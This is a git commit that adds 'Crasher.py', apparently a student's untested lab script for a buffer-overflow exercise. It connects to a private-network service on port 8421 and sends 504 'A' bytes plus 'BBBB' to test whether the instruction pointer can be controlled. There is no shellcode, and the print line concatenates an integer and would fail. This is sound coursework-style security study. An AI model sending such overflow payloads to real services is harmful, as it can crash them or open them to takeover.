f726e4dd8edb2234d7c02d3be2e45ac0837dc306
Unhelpfu1 <krogstad.josh@gmail.com>
2025-12-03 02:06:10 -0500

    Create Crasher.py

---
+++ Crasher.py
@@ -0,0 +1,26 @@
+import socket
+
+#I cannot currently get the given FML Server in MyCourses to run properly, so I cannot test this completely
+
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+#info of host
+host = "192.168.195.237" #remember to change again before running
+port = 8421
+
+sock.connect((host, port))
+
+#receive initial welcome message
+response = sock.recv(2048)
+print(response)
+
+#try giving input of a specific length to have only BBBB in EIP
+length = 504
+payload = "A"*length + "BBBB" + "C"*10
+
+print("Sending Payload of size " + length)
+sock.send(payload.encode())
+
+response = sock.recv(2048)
+print(response)
